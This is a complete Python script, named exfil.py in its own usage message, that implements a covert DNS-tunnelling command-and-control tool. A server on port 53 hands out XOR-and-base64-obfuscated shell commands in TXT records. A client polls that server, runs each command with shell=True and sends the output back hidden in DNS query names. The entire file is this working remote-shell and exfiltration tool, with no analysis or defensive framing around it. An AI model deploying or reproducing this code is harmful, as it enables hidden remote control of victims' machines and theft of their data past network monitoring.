import socket
import threading
import subprocess
import base64
from dnslib import DNSRecord, QTYPE, RR, TXT, DNSHeader


def encrypt_decrypt(data, key="Sup3rS3cur3P@ssW0Rd!!!", encrypt=True):
    key_length = len(key)
    if isinstance(data, str):
        data = data.encode()
    result = bytes(b ^ ord(key[i % key_length]) for i, b in enumerate(data))
    if encrypt:
        return base64.b64encode(result).decode('utf-8')
    else:
        decoded_data = base64.b64decode(data)
        decrypted_result = bytes(
            b ^ ord(key[i % key_length]) for i, b in enumerate(decoded_data))
        return decrypted_result.decode('utf-8', errors='ignore')

# DNS Server


class DNSServer:
    def __init__(self, host='0.0.0.0', port=53):
        self.host = host
        self.port = port
        self.current_command = None
        self.client_connected = threading.Event()

    def handle_request(self, data, addr, sock):
        try:
            request = DNSRecord.parse(data)
            qname = str(request.q.qname).strip('.')
            qtype = QTYPE[request.q.qtype]

            if qtype == "TXT":
                response = DNSRecord(
                    DNSHeader(id=request.header.id, qr=1, aa=1, ra=1),
                    q=request.q
                )

                if qname.startswith("result."):
                    encrypted_result = (qname.split(
                        "result.", 1)[1]).split(".", 1)[0]
                    decrypted_result = encrypt_decrypt(
                        encrypted_result, encrypt=False)
                    print(f"Received result from client: {decrypted_result}")
                elif self.current_command:
                    encrypted_command = encrypt_decrypt(self.current_command)
                    response.add_answer(
                        RR(qname, QTYPE.TXT, rdata=TXT(
                            encrypted_command), ttl=60)
                    )
                    self.current_command = None
                else:
                    response.add_answer(
                        RR(qname, QTYPE.TXT, rdata=TXT(""), ttl=60)
                    )
                    self.client_connected.set()

                sock.sendto(response.pack(), addr)

        except Exception as e:
            print(f"Error handling request: {e}")

    def start(self):
        print(f"DNS Server running on {self.host}:{self.port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.port))

        threading.Thread(target=self.command_input_loop).start()

        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=self.handle_request,
                             args=(data, addr, sock)).start()

    def command_input_loop(self):
        print("Waiting for client to connect...")
        self.client_connected.wait()
        print("Client connected. Ready to receive commands.")
        while True:
            self.current_command = input(
                "Enter command to execute on client: ")

# DNS Client


class DNSClient:
    def __init__(self, server_ip, server_port=53):
        self.server_ip = server_ip
        self.server_port = server_port

    def send_message(self, domain):
        while True:
            request = DNSRecord.question(domain, qtype="TXT")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            try:
                sock.sendto(request.pack(), (self.server_ip, self.server_port))
                data, _ = sock.recvfrom(512)
                response = DNSRecord.parse(data)

                for rr in response.rr:
                    if rr.rtype == QTYPE.TXT:
                        encrypted_command = rr.rdata.data[0]
                        command = encrypt_decrypt(
                            encrypted_command, encrypt=False)

                        if command:
                            print("Executing command received from server:", command)
                            result = subprocess.run(
                                command, shell=True, capture_output=True, text=True)
                            result_output = result.stdout.strip() or result.stderr.strip()
                            encrypted_result = encrypt_decrypt(result_output)
                            result_domain = f"result.{encrypted_result.replace(' ', '_')}.{
                                domain}"
                            result_request = DNSRecord.question(
                                result_domain, qtype="TXT")
                            sock.sendto(result_request.pack(),
                                        (self.server_ip, self.server_port))

            except socket.timeout:
                pass  # Retry on timeout
            except Exception as e:
                print(f"Error: {e}")
            finally:
                sock.close()


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python exfil.py server|client")
        sys.exit(1)

    mode = sys.argv[1]

    if mode == "server":
        server = DNSServer()
        server.start()

    elif mode == "client":
        if len(sys.argv) != 4:
            print("Usage: python exfil.py client <server_ip> <domain>")
            sys.exit(1)

        server_ip = sys.argv[2]
        domain = sys.argv[3]

        client = DNSClient(server_ip)
        client.send_message(domain)

    else:
        print("Invalid mode. Use 'server' or 'client'.")    